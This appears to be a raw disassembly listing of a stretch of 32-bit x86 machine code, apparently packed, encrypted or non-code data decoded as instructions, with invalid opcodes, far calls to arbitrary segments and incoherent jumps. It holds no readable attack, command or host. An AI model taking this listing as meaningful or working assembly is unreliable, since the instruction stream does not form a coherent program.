  4182fc:	sub    DWORD PTR [ecx],edi
  4182fe:	or     BYTE PTR [eax-0x43],bh
  418301:	das    
  418302:	int3   
  418303:	xchg   DWORD PTR [edi+ecx*2-0x219b8a53],esp
  41830a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830b:	push   0xfd8708e5
  418310:	push   eax
  418311:	hlt    
  418312:	repz or DWORD PTR [edx-0x5c80d707],eax
  418319:	ret    
  41831a:	fcom   DWORD PTR [ebp+0x7a10d2ae]
  418320:	sub    eax,0x306b30c
  418325:	popa   
  418326:	dec    esi
  418327:	sar    BYTE PTR [ebx],cl
  418329:	push   ss
  41832a:	pop    esi
  41832b:	cmp    DWORD PTR [eax],0x3b70c917
  418331:	lock mov dh,0x9c
  418334:	xchg   ecx,eax
  418335:	add    edi,DWORD PTR [edi-0x11ad6b92]
  41833b:	retf   0x8393
  41833e:	dec    bh
  418340:	jnp    0x418300
  418342:	loope  0x418394
  418344:	and    eax,0x4595da0c
  418349:	push   ebp
  41834a:	test   BYTE PTR [ebp-0x31],al
  41834d:	mov    ds:0x917036b6,al
  418352:	xchg   ebx,eax
  418353:	pop    esp
  418354:	aaa    
  418355:	pushf  
  418356:	jbe    0x418306
  418358:	or     eax,0xf219e88
  41835d:	sbb    al,0xf4
  41835f:	pop    eax
  418360:	outs   dx,DWORD PTR ds:[esi]
  418361:	ja     0x4182fe
  418363:	add    BYTE PTR [edx-0x4e],bl
  418366:	pusha  
  418367:	dec    edx
  418368:	dec    edx
  418369:	imul   esi,ebp,0x67
  41836c:	fst    st(3)
  41836e:	push   0x18
  418370:	scas   al,BYTE PTR es:[edi]
  418371:	sub    al,0xa1
  418373:	xor    ah,bl
  418375:	and    BYTE PTR [ebp+0x1f],ch
  418378:	lods   al,BYTE PTR ds:[esi]
  418379:	cmp    DWORD PTR ds:0xd737a162,edx
  41837f:	mov    dh,0xdb
  418381:	stos   BYTE PTR es:[edi],al
  418382:	lds    ebp,FWORD PTR [ecx-0x4e]
  418385:	mov    esi,0xf9b0887c
  41838a:	ins    DWORD PTR es:[edi],dx
  41838b:	xor    eax,0xc3177fde
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	call   0x100:0x9449c8cf
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	out    dx,eax
  41840d:	ins    BYTE PTR es:[edi],dx
  41840e:	mov    bl,0x99
  418410:	dec    edi
  418411:	jmp    0x34015796
  418416:	out    0x5d,al
  418418:	xchg   DWORD PTR [ebx],esp
  41841a:	mov    eax,ds:0xa6ee3c7d
  41841f:	loope  0x41847e
  418421:	cmp    al,bl
  418423:	inc    ebp
  418424:	rol    BYTE PTR [ecx+0x7b],cl
  418427:	out    0x97,al
  418429:	push   ebp
  41842a:	sti    
  41842b:	cli    
  41842c:	mov    ebx,0x8d85e545
  418431:	mov    ebx,0xa0418cfb
  418436:	mov    dh,0xd0
  418438:	push   es
  418439:	push   cs
  41843a:	jmp    0x418451
  41843c:	js     0x41841d
  41843e:	repz jns 0x41848d
  418441:	jbe    0x41843c
  418443:	jae    0x418411
  418445:	mov    edx,0x3f3f17d
  41844a:	jne    0x41845b
  41844c:	mov    al,ds:0xb9df73ff
  418451:	enter  0xd455,0xe7
  418455:	dec    ebp
  418456:	mov    esp,0xed2b0b8f
  41845b:	mov    edx,0xe88a72fb
  418460:	retf   
  418461:	sti    
  418462:	das    
  418463:	pop    ebp
  418464:	push   ebx
  418465:	push   eax
  418466:	loopne 0x418486
  418468:	daa    
  418469:	jae    0x418470
  41846b:	fimul  WORD PTR [ecx]
  41846d:	dec    edi
  41846e:	cdq    
  41846f:	mov    al,0x26
  418471:	test   al,0xb5
  418473:	in     al,0xd9
  418475:	mov    al,0xa8
  418477:	dec    edi
  418478:	int3   
  418479:	lds    edi,FWORD PTR [ebp-0x29]
  41847c:	add    esi,DWORD PTR [ecx]
  41847e:	mov    ds:0x39fa4401,al
  418483:	cld    
  418484:	pop    edx
  418485:	ret    0xb499
  418488:	add    al,0xc1
  41848a:	fadd   QWORD PTR [ebx+0x5a2b0ee1]
  418490:	add    ebp,DWORD PTR [ebp-0x3a42d431]
  418496:	push   ebx
  418497:	adc    cl,BYTE PTR [edi+eax*4+0x233a4892]
  41849e:	pop    ebp
  41849f:	jne    0x4184dc
  4184a1:	add    BYTE PTR [ebp-0x38f9e848],al
  4184a7:	out    0xfe,al
  4184a9:	xchg   ecx,eax
  4184aa:	pop    edi
  4184ab:	loope  0x418446
  4184ad:	scas   al,BYTE PTR es:[edi]
  4184ae:	jl     0x4184fe
  4184b0:	cmp    esp,DWORD PTR [ecx+0x36]
  4184b3:	and    esi,DWORD PTR [ebp-0x48adc4d9]
  4184b9:	lods   eax,DWORD PTR ds:[esi]
  4184ba:	sub    al,0x6b
  4184bc:	test   eax,0x2fffedf6
  4184c1:	adc    dl,cl
  4184c3:	cs pop ebp
  4184c5:	inc    ebp
  4184c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184c7:	and    eax,0x9c386f8
  4184cc:	les    ebp,FWORD PTR [ebp-0x2d]
  4184cf:	and    eax,DWORD PTR ds:0xc7a97dc4
  4184d5:	cmc    
  4184d6:	out    dx,eax
  4184d7:	(bad)  
  4184d8:	adc    al,0xa8
  4184da:	fistp  DWORD PTR [ebx-0x599529ea]
  4184e0:	inc    esp
  4184e1:	mov    ds:0x6a47d91,eax
  4184e6:	cli    
  4184e7:	and    ebp,edi
  4184e9:	cmp    al,0x87
  4184eb:	jl     0x41852c
  4184ed:	shl    DWORD PTR [eax+ecx*4-0xa],1
  4184f1:	sbb    eax,0xa2caa680
  4184f6:	pop    ecx
  4184f7:	xchg   esp,eax
  4184f8:	push   edi
  4184f9:	pushf  
  4184fa:	outs   dx,DWORD PTR ds:[esi]
  4184fb:	dec    ecx
  4184fc:	mov    ebx,0xf20b20d6
  418501:	pop    ebp
  418502:	xchg   edx,eax
  418503:	bound  edi,QWORD PTR [ecx-0x4a]
  418506:	cmp    ebx,DWORD PTR [ebp+0x2c]
  418509:	xchg   ebx,eax
  41850a:	and    eax,0x2e916d1f
  41850f:	sub    al,0x0
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	pop    ebp
  418581:	sbb    al,0x3e
  418583:	jg     0x41851d
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	xchg   esp,eax
  41858d:	dec    edi
  41858e:	scas   al,BYTE PTR es:[edi]
  41858f:	pop    ebx
  418590:	adc    edi,DWORD PTR [edx+0x5d]
  418593:	jle    0x4185be
  418595:	shl    DWORD PTR [ebx],1
  418597:	inc    edx
  418598:	stos   DWORD PTR es:[edi],eax
  418599:	(bad)  
  41859a:	sti    
  41859b:	xor    ebx,edi
  41859d:	inc    ecx
  41859e:	jae    0x418591
  4185a0:	fcomp  DWORD PTR [ebp-0x1882e257]
  4185a6:	xor    esp,DWORD PTR [esi]
  4185a8:	add    DWORD PTR [edx],ebp
  4185aa:	sbb    bl,ah
  4185ac:	not    BYTE PTR [ebx+ebx*4]
  4185af:	cli    
  4185b0:	test   eax,0x67f15f77
  4185b5:	js     0x4185ca
  4185b7:	mov    dh,0xd4
  4185b9:	loop   0x418546
  4185bb:	test   BYTE PTR [esi],al
  4185bd:	int    0xac
  4185bf:	mov    WORD PTR [ebx+edx*2],?
  4185c2:	xchg   esp,eax
  4185c3:	out    0x93,eax
  4185c5:	pop    edx
  4185c6:	xchg   esp,eax
  4185c7:	ret    
  4185c8:	xor    al,BYTE PTR [ecx]
  4185ca:	jae    0x418614
  4185cc:	outs   dx,BYTE PTR ds:[esi]
  4185cd:	push   0x7e
  4185cf:	pop    ecx
  4185d0:	and    eax,DWORD PTR [ebx+ecx*8]
  4185d3:	push   esi
  4185d4:	adc    BYTE PTR [ecx+ebp*8-0x5],0xff
  4185d9:	or     BYTE PTR [esi-0x325ef2f1],dl
  4185df:	jb     0x418589
  4185e1:	mov    ebx,0xe213685
  4185e6:	mov    cl,0x10
  4185e8:	cmp    dl,bl
  4185ea:	jns    0x418603
  4185ec:	(bad)
  4185ef:	in     eax,0x79
  4185f1:	retf   0xd1f2
  4185f4:	xchg   esp,eax
  4185f5:	mov    ecx,0x758867ef
  4185fa:	dec    esi
  4185fb:	icebp  
  4185fc:	mov    al,0x43
  4185fe:	sub    ax,0xfe8f
  418602:	and    DWORD PTR [edi-0x707305e1],0xffffffb8
  418609:	push   edi
  41860a:	shr    BYTE PTR [ebx-0x74321324],1
  418610:	add    eax,0x54ee04d8
  418615:	shl    DWORD PTR [edx+0x13634078],0xba
  41861c:	fbstp  TBYTE PTR [ebp+0x75531d49]
  418622:	inc    esi
  418623:	inc    eax
  418624:	dec    edi
  418625:	mov    eax,0x543ca42d
  41862a:	xchg   ecx,eax
  41862b:	mov    esp,DWORD PTR [edx]
  41862d:	into   
  41862e:	iret   
  41862f:	add    eax,0xe8197710
  418634:	scas   al,BYTE PTR es:[edi]
  418635:	push   ebp
  418636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418638:	pop    ss
  418639:	and    dl,BYTE PTR [ebx]
  41863b:	sub    eax,0xf11c76c7
  418640:	dec    esp
  418641:	popf   
  418642:	sbb    esi,ebp
  418644:	adc    ebp,DWORD PTR [edi+0x5095950f]
  41864a:	lar    edi,WORD PTR [esi-0x7b]
  41864e:	jnp    0x41865d
  418650:	jl     0x418642
  418652:	ja     0x41861d
  418654:	aam    0xf4
  418656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418657:	fs xor al,0x6a
  41865a:	pmaxsw mm3,QWORD PTR [ecx]
  41865d:	inc    esi
  41865e:	lock mov ebx,0x9a73fa9e
  418664:	nop
  418665:	pop    es
  418666:	fstp   DWORD PTR [edx]
  418668:	(bad)  
  418669:	stc    
  41866a:	fldcw  WORD PTR [ebp+0x39]
  41866d:	mov    ds:0xf04805d8,eax
  418672:	and    DWORD PTR [ebp+0x55],edi
  418675:	mov    BYTE PTR [esi],cl
  418677:	jge    0x41869b
  418679:	ror    cl,0x60
  41867c:	push   0x7078f13a
  418681:	sar    BYTE PTR [esi+0x26],1
  418684:	add    DWORD PTR ss:[eax-0x4dde56ef],edx
  41868b:	jns    0x4186ca
  41868d:	push   edx
  41868e:	adc    DWORD PTR [eax+eax*1+0x0],edi
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	popf   
  418701:	enter  0x47d9,0x9c
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	pop    es
  41870d:	into   
  41870e:	mov    WORD PTR [edi+ecx*1+0x2a7c2cb7],cs
  418715:	and    BYTE PTR [ecx],bh
  418717:	(bad)  
  418718:	fcom   DWORD PTR [ebp+0x3c51eb1a]
  41871e:	jg     0x4186cf
  418720:	push   edi
  418721:	push   esp
  418722:	mov    esp,0xf0899702
  418728:	icebp  
  418729:	into   
  41872a:	lea    ebx,[edi+0x7e]
  41872d:	ins    BYTE PTR es:[edi],dx
  41872e:	adc    eax,0x79cb87f1
  418733:	jp     0x418774
  418735:	push   ecx
  418736:	cli    
  418737:	mov    ecx,0x27ba1f3a
  41873c:	mov    WORD PTR [ebx+0x171793d5],ds
  418742:	das    
  418743:	outs   dx,DWORD PTR ds:[esi]
  418744:	hlt    
  418745:	(bad)  
  418746:	cli    
  418747:	loopne 0x418728
  418749:	rcr    DWORD PTR [edi-0x3280e7b0],cl
  41874f:	pop    ebp
  418750:	add    eax,0x93e75673
  418755:	loop   0x41879e
  418757:	aad    0x50
  418759:	dec    ecx
  41875a:	ret    
  41875b:	stos   BYTE PTR es:[edi],al
  41875c:	mov    esp,edx
  41875e:	add    dl,al
  418760:	push   edx
  418761:	add    dl,dh
  418763:	mov    eax,ds:0xf36c6619
  418768:	ja     0x418730
  41876a:	jecxz  0x418757
  41876c:	pop    ebx
  41876d:	xor    DWORD PTR [esi+0x7e47bd5d],edx
  418773:	aad    0xa7
  418775:	loopne 0x418772
  418777:	pop    ebp
  418778:	aaa    
  418779:	lods   al,BYTE PTR ds:[esi]
  41877a:	bound  ebx,QWORD PTR [ebx-0x36]
  41877d:	xchg   edi,eax
  41877e:	mov    eax,ds:0xef95ed5b
  418783:	sub    ecx,DWORD PTR [edx-0x4268dd2b]
  418789:	sbb    dl,ch
  41878b:	mov    dl,0x58
  41878d:	dec    ebx
  41878e:	lods   al,BYTE PTR ds:[esi]
  41878f:	dec    eax
  418790:	data16 cs daa 
  418793:	sbb    esi,DWORD PTR ss:[ecx-0x2e611aec]
  41879a:	icebp  
  41879b:	dec    esi
  41879c:	fist   DWORD PTR [esi]
  41879e:	sbb    BYTE PTR [edi+edx*8-0x3e477638],bh
  4187a5:	adc    BYTE PTR [esi-0x3f3eec63],ch
  4187ab:	push   ecx
  4187ac:	jmp    0x7b98:0x9293ca2
  4187b3:	ins    DWORD PTR es:[edi],dx
  4187b4:	mov    edi,0x1dc65114
  4187b9:	mov    ecx,eax
  4187bb:	mov    eax,ds:0x8e42d866
  4187c0:	mov    BYTE PTR [eax],ch
  4187c2:	scas   eax,DWORD PTR es:[edi]
  4187c3:	mov    edi,0x8392e9f5
  4187c8:	add    DWORD PTR [edi-0x14],edi
  4187cb:	out    dx,eax
  4187cc:	mov    edx,0x36375ac3
  4187d1:	or     al,0x67
  4187d3:	popa   
  4187d4:	scas   eax,DWORD PTR es:[edi]
  4187d5:	cmp    esi,DWORD PTR [ebp-0x7e1ff0c9]
  4187db:	mov    edi,DWORD PTR [ebp-0x58]
  4187de:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4187e0:	jl     0x4187ae
  4187e2:	in     eax,0x3c
  4187e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e5:	out    dx,eax
  4187e6:	mov    ecx,0x5cc014c0
  4187eb:	cmp    al,0xb8
  4187ed:	jl     0x418782
  4187ef:	nop
  4187f0:	jae    0x418840
  4187f2:	mov    edx,0xdac76df7
  4187f7:	es ins DWORD PTR es:[edi],dx
  4187f9:	jmp    0xa3a7c516
  4187fe:	and    eax,0xc86664f3
  418803:	push   ecx
  418804:	call   0x5755:0xb8ac02b7
  41880b:	adc    DWORD PTR [ebp+0xaae2a6],0x0
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi+0x459c3acd]
  418881:	jne    0x41884f
  418883:	xchg   ecx,eax
  418884:	mov    al,ds:0x4000103
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR [ebp+edx*2-0x5c],cl
  41888f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418890:	aad    0xcc
  418892:	pop    edx
  418893:	add    al,0x4e
  418895:	sbb    eax,0x8c0d7d70
  41889a:	or     ecx,DWORD PTR [ebx+0x86dcc31]
  4188a0:	ins    BYTE PTR es:[edi],dx
  4188a1:	les    ebx,FWORD PTR [ebx]
  4188a3:	icebp  
  4188a4:	push   edx
  4188a5:	mov    edi,DWORD PTR [esi]
  4188a7:	add    eax,0x4486fc40
  4188ac:	jecxz  0x41892a
  4188ae:	push   0x826a157
  4188b3:	inc    esp
  4188b4:	add    BYTE PTR [ebp+0x29d50ebe],0xf7
  4188bb:	push   eax
  4188bc:	(bad)  
  4188bd:	dec    ebx
  4188be:	jl     0x41893c
  4188c0:	lahf   
  4188c1:	mov    eax,ds:0x710ae817
  4188c6:	dec    edx
  4188c7:	add    ebx,DWORD PTR [edi]
  4188c9:	lahf   
  4188ca:	pop    ds
  4188cb:	outs   dx,DWORD PTR ds:[esi]
  4188cc:	ds sbb eax,0xcecc64b4
  4188d2:	xchg   ebp,eax
  4188d3:	pop    edx
  4188d4:	lds    edi,FWORD PTR [ecx+0xc1fa775]
  4188da:	ds scas al,BYTE PTR es:[edi]
  4188dc:	outs   dx,BYTE PTR ds:[esi]
  4188dd:	cmp    al,0x79
  4188df:	(bad)  
  4188e0:	(bad)  
  4188e1:	dec    esi
  4188e2:	std    
  4188e3:	dec    ecx
  4188e4:	cld    
  4188e5:	pop    esp
  4188e6:	sbb    bh,BYTE PTR [edi-0x4f]
  4188e9:	ret    
  4188ea:	sub    al,0xd6
  4188ec:	mov    ch,0x60
  4188ee:	sub    ebx,esp
  4188f0:	sti    
  4188f1:	mov    eax,?
  4188f3:	gs push edi
  4188f5:	stos   DWORD PTR es:[edi],eax
  4188f6:	call   0xb2a8:0x97ab1fd0
  4188fd:	mov    eax,ds:0xf73d7f3
  418902:	jnp    0x41894d
  418904:	(bad)  
  418905:	(bad)  
  418907:	popf   
  418908:	iret   
  418909:	sub    eax,0xbfba4e90
  41890e:	adc    ch,BYTE PTR [eax]
  418910:	imul   BYTE PTR [ebx+0x3313e0db]
  418916:	pop    ecx
  418917:	mov    edx,0x8782ed33
  41891c:	mov    ah,0x62
  41891e:	cmp    ecx,DWORD PTR [edi-0x2a]
  418921:	jecxz  0x41898a
  418923:	enter  0x9e4a,0x58
  418927:	jbe    0x41890c
  418929:	call   0xf864:0xb23bf02a
  418930:	pop    edx
  418931:	xchg   ebp,eax
  418932:	sbb    al,0xbc
  418934:	push   ecx
  418935:	aas    
  418936:	mov    esi,0xbfa6decf
  41893b:	pop    ecx
  41893c:	js     0x418932
  41893e:	mov    ebx,0x892f423a
  418943:	mov    dh,0xdf
  418945:	(bad)
  418949:	iret   
  41894a:	mov    ecx,0x22db34f5
  41894f:	adc    eax,0xd1bd9540
  418954:	pop    ebx
  418955:	mov    esp,0xfc277e27
  41895a:	cmp    BYTE PTR [edx],bh
  41895c:	pusha  
  41895d:	fwait
  41895e:	sub    BYTE PTR [ecx+0x21],al
  418961:	mov    ah,0xdc
  418963:	call   0x9fe5:0x43b0c376
  41896a:	push   0xffffff99
  41896c:	out    dx,al
  41896d:	mul    BYTE PTR [esi*8+0x4c645c71]
  418974:	aaa    
  418975:	mov    ds:0x896080a,eax
  41897a:	mov    esp,0x5bb8224f
  41897f:	popa   
  418980:	je     0x4189e8
  418982:	jecxz  0x41898f
  418984:	into   
  418985:	dec    eax
  418986:	out    0x18,eax
  418988:	xor    cl,BYTE PTR [ecx+0x2499ee51]
  41898e:	inc    esp
  41898f:	rol    DWORD PTR [eax],cl
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x42741269
  418a03:	cld    
  418a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR [ecx+eax*1],al
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	xchg   ebx,eax
  418a0d:	rol    DWORD PTR [edx-0x46d2c534],0x57
  418a14:	pop    ebp
  418a15:	fdivr  QWORD PTR [eax+ebp*4+0x2e]
  418a19:	jb     0x418a39
  418a1b:	mov    ss,WORD PTR [ebx-0x471b4236]
  418a21:	call   0x1061b281
  418a26:	jbe    0x4189db
  418a28:	ss ret 0xc18c
  418a2c:	lds    ebx,FWORD PTR [bx+si]
  418a2f:	stos   DWORD PTR es:[edi],eax
  418a30:	and    esp,DWORD PTR [edx+0x5269530a]
  418a36:	call   0x517af96b
  418a3b:	push   esi
  418a3c:	push   0xc3786d15
  418a41:	aad    0xe0
  418a43:	(bad)  
  418a45:	imul   edi,DWORD PTR [ecx],0x2027d96
  418a4b:	lock sub al,bl
  418a4e:	xchg   ebp,eax
  418a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a50:	push   ebx
  418a51:	or     ebp,esi
  418a53:	dec    ebx
  418a54:	mov    WORD PTR [ecx-0x473f4efe],ss
  418a5a:	jg     0x418a57
  418a5c:	test   DWORD PTR [ecx],esp
  418a5e:	xor    al,BYTE PTR [ebx+0x4c]
  418a61:	ret    0x2567
  418a64:	sub    eax,0xe47375b2
  418a69:	xchg   BYTE PTR [esp+edi*1-0x2ffb0c90],al
  418a70:	mov    ds:0x9562e706,al
  418a75:	(bad)  
  418a76:	loop   0x418ab1
  418a78:	mov    ds:0xe754d579,al
  418a7d:	cmp    bh,BYTE PTR [edi+ecx*1+0x1e172eef]
  418a84:	adc    al,0x3b
  418a86:	mov    ebp,esp
  418a88:	stos   BYTE PTR es:[edi],al
  418a89:	test   eax,0x7f289c86
  418a8e:	stos   BYTE PTR es:[edi],al
  418a8f:	xor    BYTE PTR [edx],0xe5
  418a92:	xchg   ebp,eax
  418a93:	cld    
  418a94:	jmp    0x81b0992
  418a99:	sub    edi,esp
  418a9b:	push   eax
  418a9c:	xor    esi,ecx
  418a9e:	mov    al,ds:0x8386e9e8
  418aa3:	mov    ebx,0x40cd0c73
  418aa8:	scas   eax,DWORD PTR es:[edi]
  418aa9:	mov    esi,0x494ce6cb
  418aae:	fidiv  DWORD PTR gs:[ebp-0x17]
  418ab2:	cwde   
  418ab3:	and    al,0xe2
  418ab5:	xor    eax,0x848648d2
  418aba:	xor    DWORD PTR [edi],ecx
  418abc:	jbe    0x418b3c
  418abe:	sub    BYTE PTR [ebp-0x3],ah
  418ac1:	mov    esi,0x95455efc
  418ac6:	gs fs into 
  418ac9:	es add esp,ebp
  418acc:	add    eax,0x9862ac8
  418ad1:	xor    BYTE PTR [esi-0x12],bl
  418ad4:	fstp   DWORD PTR [esi-0x19df7cfb]
  418ada:	dec    ebx
  418adb:	mov    esp,0xaeee9b5e
  418ae0:	ds jo  0x418aef
  418ae3:	sbb    DWORD PTR [eax-0x24],0x99af09fe
  418aea:	js     0x418abb
  418aec:	int3   
  418aed:	in     al,dx
  418aee:	(bad)  
  418aef:	sti    
  418af0:	xlat   BYTE PTR ds:[ebx]
  418af1:	inc    ebx
  418af2:	fstp   DWORD PTR [ecx]
  418af4:	xor    BYTE PTR [edi-0x33],bh
  418af7:	out    0x3d,eax
  418af9:	mov    dh,0x7e
  418afb:	cmp    DWORD PTR [edx-0x49],edi
  418afe:	fcmovnbe st,st(0)
  418b00:	ret    
  418b01:	pushf  
  418b02:	fild   QWORD PTR [ecx+0x59]
  418b05:	mul    ebp
  418b07:	loop   0x418acb
  418b09:	call   0xe8cd:0xcae15912
	...
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x20
  418b81:	scas   eax,DWORD PTR es:[edi]
  418b82:	sar    BYTE PTR [edi+0x105a8],0x4
  418b89:	add    DWORD PTR [eax],eax
  418b8b:	add    al,bh
  418b8d:	xor    DWORD PTR cs:[edx-0x17],esp
  418b91:	xchg   esi,eax
  418b92:	jnp    0x418b8f
  418b94:	ins    BYTE PTR es:[edi],dx
  418b95:	jecxz  0x418b2f
  418b97:	stos   DWORD PTR es:[edi],eax
  418b98:	push   esi
  418b99:	cmp    dh,bh
  418b9b:	popf   
  418b9c:	jmp    0x418b62
  418b9e:	sub    ah,BYTE PTR [eax-0x68]
  418ba1:	hlt    
  418ba2:	mov    esi,0xd2b6a1a5
  418ba7:	out    0x33,al
  418ba9:	leave  
  418baa:	popa   
  418bab:	fld    QWORD PTR [ecx+0x11002982]
  418bb1:	mov    esi,0xcf59e7b6
  418bb6:	inc    edx
  418bb7:	or     ecx,DWORD PTR [ebx-0x5ff91ac4]
  418bbd:	xacquire xchg DWORD PTR [ebx],edi
  418bc0:	fadd   QWORD PTR [edi+0x77837fe1]
  418bc6:	jnp    0x418b72
  418bc8:	scas   eax,DWORD PTR es:[edi]
  418bc9:	lahf   
  418bca:	aas    
  418bcb:	xor    DWORD PTR [ebx],0x52f6c59
  418bd1:	mov    DWORD PTR [edx],ebp
  418bd3:	ja     0x418b61
  418bd5:	sahf   
  418bd6:	jnp    0x418be9
  418bd8:	push   ds
  418bd9:	inc    esp
  418bda:	cmp    bh,BYTE PTR [edx]
  418bdc:	aam    0x2a
  418bde:	cmp    eax,0xb7b3dfd4
  418be3:	cwde   
  418be4:	scas   al,BYTE PTR es:[edi]
  418be5:	cmp    DWORD PTR [ecx-0x28caf5a4],eax
  418beb:	mov    ecx,0x94461ddc
  418bf0:	adc    DWORD PTR [edi],esp
  418bf2:	call   0x4b19133d
  418bf7:	fisttp WORD PTR [esp+eax*4-0x57]
  418bfb:	jno    0x418c3c
  418bfd:	in     eax,dx
  418bfe:	dec    ebp
  418bff:	xchg   edx,eax
  418c00:	rol    DWORD PTR ds:0xde6a6b34,0xb3
  418c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c08:	daa    
  418c09:	mov    dl,0x70
  418c0b:	shl    BYTE PTR [bp+si+0x28],0x38
  418c10:	jge    0x418beb
  418c12:	jecxz  0x418c92
  418c14:	mov    ecx,0xa04a7c65
  418c19:	jno    0x418c6c
  418c1b:	aad    0xb2
  418c1d:	outs   dx,BYTE PTR ds:[esi]
  418c1e:	loop   0x418c4b
  418c20:	mov    edx,0x933cf2a4
  418c25:	mov    ah,0x98
  418c27:	out    0x3c,al
  418c29:	sub    BYTE PTR [esi+0x71e4cdc2],0xba
  418c30:	and    BYTE PTR [ecx+0x7d],ah
  418c33:	sbb    DWORD PTR [ebp+0x4bd2b1c4],edi
  418c39:	mov    edi,0xc553feb2
  418c3e:	in     eax,dx
  418c3f:	fisubr WORD PTR [eax+0x6a420004]
  418c45:	jb     0x418c4e
  418c47:	into   
  418c48:	pop    ds
  418c49:	sbb    al,0x90
  418c4b:	outs   dx,DWORD PTR ds:[esi]
  418c4c:	mov    esp,0x8b1e44a5
  418c51:	push   0xb9496205
  418c56:	(bad)  
  418c57:	fist   DWORD PTR [eax+0x69]
  418c5a:	int    0x71
  418c5c:	repz mov ch,0x0
  418c5f:	jae    0x418ccc
  418c61:	and    edx,DWORD PTR [esi-0x420b8689]
  418c67:	ret    0x896c
  418c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c6b:	cli    
  418c6c:	lods   eax,DWORD PTR ds:[esi]
  418c6d:	jg     0x418c8d
  418c6f:	repnz lock mov ds:0x4a239bbd,al
  418c76:	inc    eax
  418c77:	xlat   BYTE PTR ds:[ebx]
  418c78:	mov    esi,0x35528a59
  418c7d:	loop   0x418c20
  418c7f:	and    DWORD PTR [ebp+0x3a788882],edi
  418c85:	xchg   esi,eax
  418c86:	adc    dh,BYTE PTR [ecx]
  418c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c89:	xor    bl,BYTE PTR [edi-0x46]
  418c8c:	xor    BYTE PTR [ebx],dl
  418c8e:	and    DWORD PTR [eax+eax*1],edx
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shl    BYTE PTR [ecx],cl
  418d01:	push   es
  418d02:	inc    ebx
  418d03:	xor    al,0xac
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	popf   
  418d0d:	stc    
  418d0e:	ss xchg ecx,eax
  418d10:	ins    DWORD PTR es:[edi],dx
  418d11:	popa   
  418d12:	pop    ss
  418d13:	mov    eax,ds:0xb3469103
  418d18:	push   ecx
  418d19:	push   ss
  418d1a:	xchg   dh,dl
  418d1c:	push   es
  418d1d:	push   ecx
  418d1e:	repnz pop esi
  418d20:	xchg   esp,eax
  418d21:	jp     0x418d08
  418d23:	stos   DWORD PTR es:[edi],eax
  418d24:	sbb    al,0x35
  418d26:	ret    0x4054
  418d29:	ins    DWORD PTR es:[edi],dx
  418d2a:	mov    bl,0x13
  418d2c:	test   al,0x7d
  418d2e:	push   cs
  418d2f:	adc    dh,al
  418d31:	int    0xe1
  418d33:	inc    eax
  418d34:	into   
  418d35:	in     eax,0x91
  418d37:	fldenv [ebx+ebx*8+0x1b638373]
  418d3e:	popa   
  418d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d40:	add    eax,0x3eab7c78
  418d45:	cdq    
  418d46:	dec    ebx
  418d47:	aas    
  418d48:	and    DWORD PTR [ecx],ecx
  418d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d4b:	scas   al,BYTE PTR es:[edi]
  418d4c:	jmp    0x6785:0x36f0accb
  418d53:	xchg   ebx,ebp
  418d55:	inc    esp
  418d56:	je     0x418cf8
  418d58:	inc    ebx
  418d59:	gs pop ss
  418d5b:	adc    dh,ch
  418d5d:	xchg   al,al
  418d5f:	jl     0x418d97
  418d61:	stos   DWORD PTR es:[edi],eax
  418d62:	fild   DWORD PTR [ecx+0x38]
  418d65:	(bad)  
  418d66:	dec    ecx
  418d67:	adc    BYTE PTR [esi+0x424a1ed8],bh
  418d6d:	adc    DWORD PTR [ebx-0x1e],edx
  418d70:	and    dl,ah
